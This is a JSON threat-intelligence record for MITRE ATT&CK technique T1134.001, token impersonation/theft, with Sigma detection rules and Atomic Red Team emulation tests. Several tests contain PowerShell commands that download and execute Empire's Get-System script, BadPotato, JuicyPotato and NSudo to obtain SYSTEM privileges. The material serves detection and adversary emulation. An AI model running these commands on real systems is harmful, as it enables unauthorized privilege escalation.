{
    "id": "T1134.001",
    "name": "Token Impersonation/Theft",
    "description": "Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using `DuplicateToken(Ex)`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.",
    "platforms": "Windows",
    "kill_chain_phases": "Defense Evasion, Privilege Escalation",
    "data_sources": "Process: OS API Execution, Command: Command Execution",
    "detection": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the `runas` command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\nAnalysts can also monitor for use of Windows APIs such as `DuplicateToken(Ex)`, ` ImpersonateLoggedOnUser `, and ` SetThreadToken ` and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
    "url": "https://attack.mitre.org/techniques/T1134/001",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "86850eff-2729-40c3-b85e-c4af26da4a2d",
                    "cf0c254b-22f1-4b2b-8221-e137b3c0af94",
                    "f89b08d0-77ad-4728-817b-9b16c5a69c7a",
                    "843544a7-56e0-4dcc-a44f-5cc266dd97d6",
                    "02f7c9c1-1ae8-4c6a-8add-04693807f92f",
                    "f35d4a9f-881b-46b7-9d8a-887a40bce133",
                    "0adc67e0-a68f-4ffd-9c43-28905aad5d6a",
                    "ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34",
                    "827e941e-4a99-4e2c-a578-bfcec2d40552",
                    "15619216-e993-4721-b590-4c520615a67d"
                ],
                "lookup_results": [
                    {
                        "uuid": "86850eff-2729-40c3-b85e-c4af26da4a2d",
                        "lookup_data": {
                            "mitre-attack-id": "T1134.001",
                            "mitre-cti:description": "Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\n\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.",
                            "mitre-cti:name": "Token Impersonation/Theft",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d', 'type': 'attack-pattern', 'created': '2020-02-18T16:39:06.289Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1134.001', 'url': 'https://attack.mitre.org/techniques/T1134/001'}, {'url': 'https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing', 'description': 'Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.', 'source_name': 'Microsoft Command-line Logging'}], 'modified': '2020-03-26T21:29:18.608Z', 'name': 'Token Impersonation/Theft', 'description': \"Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\\n\\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.\", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}], 'x_mitre_detection': 'If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\\n\\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Command: Command Execution', 'Process: OS API Execution'], 'x_mitre_defense_bypassed': ['Windows User Account Control', 'System access controls', 'File system access controls']}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cf0c254b-22f1-4b2b-8221-e137b3c0af94",
                        "lookup_data": {
                            "description": "Detects execution of the Impersonate tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively",
                            "raw": "author: Sai Prashanth Pulisetti @pulisettis\ndate: 2022/12/21\ndescription: Detects execution of the Impersonate tool. Which can be used to manipulate\n  tokens on a Windows computers remotely (PsExec/WmiExec) or interactively\ndetection:\n  condition: all of selection_commandline_* or 1 of selection_hash_*\n  selection_commandline_exe:\n    CommandLine|contains: impersonate.exe\n  selection_commandline_opt:\n    CommandLine|contains:\n    - ' list '\n    - ' exec '\n    - ' adduser '\n  selection_hash_ext:\n  - md5: 9520714AB576B0ED01D1513691377D01\n  - sha256: E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A\n  - Imphash: 0A358FFC1697B7A07D0E817AC740DF62\n  selection_hash_plain:\n    Hashes|contains:\n    - MD5=9520714AB576B0ED01D1513691377D01\n    - SHA256=E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A\n    - IMPHASH=0A358FFC1697B7A07D0E817AC740DF62\nfalsepositives:\n- Unknown\nid: cf0c254b-22f1-4b2b-8221-e137b3c0af94\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/\n- https://github.com/sensepost/impersonate\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1134.001\n- attack.t1134.003\ntitle: Impersonate Execution\n",
                            "sigma:id": "cf0c254b-22f1-4b2b-8221-e137b3c0af94",
                            "title": "Impersonate Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f89b08d0-77ad-4728-817b-9b16c5a69c7a",
                        "lookup_data": {
                            "description": "Detects execution of the SharpImpersonation tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively",
                            "raw": "author: Sai Prashanth Pulisetti @pulisettis, Nasreddine Bencherchali\ndate: 2022/12/27\ndescription: Detects execution of the SharpImpersonation tool. Which can be used to\n  manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively\ndetection:\n  condition: 1 of selection_*\n  selection_cli:\n  - CommandLine|contains|all:\n    - ' user:'\n    - ' binary:'\n  - CommandLine|contains|all:\n    - ' user:'\n    - ' shellcode:'\n  - CommandLine|contains:\n    - ' technique:CreateProcessAsUserW'\n    - ' technique:ImpersonateLoggedOnuser'\n  selection_img:\n  - Image|endswith: \\SharpImpersonation.exe\n  - OriginalFileName: SharpImpersonation.exe\nfalsepositives:\n- Unknown\nid: f89b08d0-77ad-4728-817b-9b16c5a69c7a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/\n- https://github.com/S3cur3Th1sSh1t/SharpImpersonation\nrelated:\n- id: cf0c254b-22f1-4b2b-8221-e137b3c0af94\n  type: similar\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1134.001\n- attack.t1134.003\ntitle: SharpImpersonation Execution\n",
                            "sigma:id": "f89b08d0-77ad-4728-817b-9b16c5a69c7a",
                            "title": "SharpImpersonation Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "843544a7-56e0-4dcc-a44f-5cc266dd97d6",
                        "lookup_data": {
                            "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation",
                            "raw": "author: Teymur Kheirkhabarov, Ecco, Florian Roth\ndate: 2019/10/26\ndescription: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting\n  a specific service installation\ndetection:\n  condition: selection_id and selection\n  selection:\n  - ImagePath|contains|all:\n    - cmd\n    - /c\n    - echo\n    - \\pipe\\\n  - ImagePath|contains|all:\n    - '%COMSPEC%'\n    - /c\n    - echo\n    - \\pipe\\\n  - ImagePath|contains|all:\n    - cmd.exe\n    - /c\n    - echo\n    - \\pipe\\\n  - ImagePath|contains|all:\n    - rundll32\n    - .dll,a\n    - '/p:'\n  - ImagePath|startswith: \\\\\\\\127.0.0.1\\\\ADMIN$\\\n  selection_id:\n    EventID: 7045\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Highly unlikely\nfields:\n- ComputerName\n- SubjectDomainName\n- SubjectUserName\n- ImagePath\nid: 843544a7-56e0-4dcc-a44f-5cc266dd97d6\nlevel: critical\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n- https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.t1134.001\n- attack.t1134.002\ntitle: Meterpreter or Cobalt Strike Getsystem Service Installation - System\n",
                            "sigma:id": "843544a7-56e0-4dcc-a44f-5cc266dd97d6",
                            "title": "Meterpreter or Cobalt Strike Getsystem Service Installation - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "02f7c9c1-1ae8-4c6a-8add-04693807f92f",
                        "lookup_data": {
                            "description": "This rule tries to detect token impersonation and theft. (Example: DuplicateToken(Ex) and ImpersonateLoggedOnUser with the LOGON32_LOGON_NEW_CREDENTIALS flag.)",
                            "raw": "author: Michaela Adams, Zach Mathis\ndate: 2022/11/06\ndescription: 'This rule tries to detect token impersonation and theft. (Example: DuplicateToken(Ex)\n  and ImpersonateLoggedOnUser with the LOGON32_LOGON_NEW_CREDENTIALS flag.)'\ndetection:\n  condition: selection\n  selection:\n    AuthenticationPackageName: Negotiate\n    EventID: 4624\n    ImpersonationLevel: '%%1833'\n    LogonProcessName: Advapi\n    LogonType: 9\nfalsepositives:\n- Anti-Virus\nid: 02f7c9c1-1ae8-4c6a-8add-04693807f92f\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/11/06\nreferences:\n- https://www.elastic.co/fr/blog/how-attackers-abuse-access-token-manipulation\n- https://www.manageengine.com/log-management/cyber-security/access-token-manipulation.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1134.001\ntitle: Access Token Abuse\n",
                            "sigma:id": "02f7c9c1-1ae8-4c6a-8add-04693807f92f",
                            "title": "Access Token Abuse",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f35d4a9f-881b-46b7-9d8a-887a40bce133",
                        "lookup_data": {
                            "description": "The SideWalk may be as dangerous as the CROSSWALK",
                            "link": "http://www.botvrij.eu/data/feed-osint/f35d4a9f-881b-46b7-9d8a-887a40bce133.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1630180802",
                            "uuid": "f35d4a9f-881b-46b7-9d8a-887a40bce133",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0adc67e0-a68f-4ffd-9c43-28905aad5d6a",
                        "lookup_data": {
                            "description": "Detects creation of default named pipes used by the Koh tool",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/08\ndescription: Detects creation of default named pipes used by the Koh tool\ndetection:\n  condition: selection\n  selection:\n    PipeName|contains:\n    - \\imposecost\n    - \\imposingcost\nfalsepositives:\n- Unlikely\nid: 0adc67e0-a68f-4ffd-9c43-28905aad5d6a\nlevel: critical\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular. How to test detection? You can\n    check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nreferences:\n- https://github.com/GhostPack/Koh/blob/0283d9f3f91cf74732ad377821986cfcb088e20a/Clients/BOF/KohClient.c#L12\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.credential_access\n- attack.t1528\n- attack.t1134.001\ntitle: Koh Default Named Pipes\n",
                            "sigma:id": "0adc67e0-a68f-4ffd-9c43-28905aad5d6a",
                            "title": "Koh Default Named Pipes",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34",
                        "lookup_data": {
                            "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation",
                            "raw": "author: Teymur Kheirkhabarov, Ecco, Florian Roth\ndate: 2019/10/26\ndescription: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting\n  a specific service installation\ndetection:\n  condition: selection_id and selection\n  selection:\n  - ServiceFileName|contains|all:\n    - cmd\n    - /c\n    - echo\n    - \\pipe\\\n  - ServiceFileName|contains|all:\n    - '%COMSPEC%'\n    - /c\n    - echo\n    - \\pipe\\\n  - ServiceFileName|contains|all:\n    - cmd.exe\n    - /c\n    - echo\n    - \\pipe\\\n  - ServiceFileName|contains|all:\n    - rundll32\n    - .dll,a\n    - '/p:'\n  selection_id:\n    EventID: 4697\nfalsepositives:\n- Highly unlikely\nfields:\n- ComputerName\n- SubjectDomainName\n- SubjectUserName\n- ServiceFileName\nid: ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34\nlevel: critical\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n- https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/\nrelated:\n- id: 843544a7-56e0-4dcc-a44f-5cc266dd97d6\n  type: derived\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.t1134.001\n- attack.t1134.002\ntitle: Meterpreter or Cobalt Strike Getsystem Service Installation - Security\n",
                            "sigma:id": "ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34",
                            "title": "Meterpreter or Cobalt Strike Getsystem Service Installation - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "827e941e-4a99-4e2c-a578-bfcec2d40552",
                        "lookup_data": {
                            "description": "Malware analysis report on SparrowDoor malware",
                            "link": "http://www.botvrij.eu/data/feed-osint/827e941e-4a99-4e2c-a578-bfcec2d40552.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1650959349",
                            "uuid": "827e941e-4a99-4e2c-a578-bfcec2d40552",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "15619216-e993-4721-b590-4c520615a67d",
                        "lookup_data": {
                            "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting",
                            "raw": "author: Teymur Kheirkhabarov, Ecco, Florian Roth\ndate: 2019/10/26\ndescription: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting\n  a specific service starting\ndetection:\n  condition: selection_1 and selection_2 and not filter1\n  filter1:\n    CommandLine|contains: MpCmdRun\n  selection_1:\n    ParentImage|endswith: \\services.exe\n  selection_2:\n  - CommandLine|contains|all:\n    - cmd\n    - /c\n    - echo\n    - \\pipe\\\n  - CommandLine|contains|all:\n    - '%COMSPEC%'\n    - /c\n    - echo\n    - \\pipe\\\n  - CommandLine|contains|all:\n    - cmd.exe\n    - /c\n    - echo\n    - \\pipe\\\n  - CommandLine|contains|all:\n    - rundll32\n    - .dll,a\n    - '/p:'\nfalsepositives:\n- Commandlines containing components like cmd accidentally\n- Jobs and services started with cmd\nfields:\n- ComputerName\n- User\n- CommandLine\nid: 15619216-e993-4721-b590-4c520615a67d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n- https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.t1134.001\n- attack.t1134.002\ntitle: Meterpreter or Cobalt Strike Getsystem Service Start\n",
                            "sigma:id": "15619216-e993-4721-b590-4c520615a67d",
                            "title": "Meterpreter or Cobalt Strike Getsystem Service Start",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1134.001",
                "display_name": "Access Token Manipulation: Token Impersonation/Theft",
                "atomic_tests": [
                    {
                        "name": "Named pipe client impersonation",
                        "auto_generated_guid": "90db9e27-8e7c-4c04-b602-a45927884966",
                        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "`SeDebugPrivilege` token duplication",
                        "auto_generated_guid": "34f0a430-9d04-4d98-bcb5-1989f14719f0",
                        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Launch NSudo Executable",
                        "auto_generated_guid": "7be1bc0f-d8e5-4345-9333-f5f67d742cb9",
                        "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "nsudo_path": {
                                "description": "Path to the NSudoLG.exe file",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1134.001\\bin\\NSudoLG.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "NSudoLG.exe must exist in the specified path #{nsudo_path}\n",
                                "prereq_command": "if (Test-Path \"#{nsudo_path}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" \"https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo Launcher\\x64\\NSudoLG.exe\" \"#{nsudo_path}\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -Recurse -ErrorAction Ignore\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\" -Recurse -ErrorAction Ignore\n"
                            }
                        ],
                        "executor": {
                            "command": "Start-Process \"#{nsudo_path}\" -Argument \"-U:T -P:E cmd\"\nStart-Sleep -Second 5\nStop-Process -Name \"cmd\" -force -erroraction silentlycontinue\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Bad Potato",
                        "auto_generated_guid": "9c6d799b-c111-4749-a42f-ec2f8cb51448",
                        "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "BadPotato.exe must exist in the temp directory\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\" \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true\"\n"
                            }
                        ],
                        "executor": {
                            "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n",
                            "cleanup_command": "taskkill /f /im notepad.exe\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Juicy Potato",
                        "auto_generated_guid": "f095e373-b936-4eb4-8d22-f47ccbfbe64a",
                        "description": "This Atomic utilizes Juicy Potato to obtain privilege escalation. \nUpon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.\nThis tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "potato_path": {
                                "description": "Path to the JuicyPotato.exe file",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\JuicyPotato.exe"
                            },
                            "listening_port": {
                                "description": "COM server listen port",
                                "type": "integer",
                                "default": 7777
                            },
                            "target_exe": {
                                "description": "Target executable to launch with system privileges",
                                "type": "path",
                                "default": "$env:windir\\system32\\notepad.exe"
                            },
                            "target_CLSID": {
                                "description": "Vulnerable CLSID to impersonate privileges",
                                "type": "string",
                                "default": "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "JuicyPotato.exe must exist on disk\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\JuicyPotato.exe\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\JuicyPotato.exe\" \"https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe\"\n"
                            }
                        ],
                        "executor": {
                            "command": "cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'\n",
                            "cleanup_command": "get-ciminstance Win32_Process | where-object { $_.Path -eq \"#{target_exe}\" } | invoke-cimmethod -methodname \"terminate\" | out-null\nget-ciminstance Win32_Process | where-object { $_.Path -eq \"#{potato_path}\" } | invoke-cimmethod -methodname \"terminate\" | out-null\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 13:24:29"
}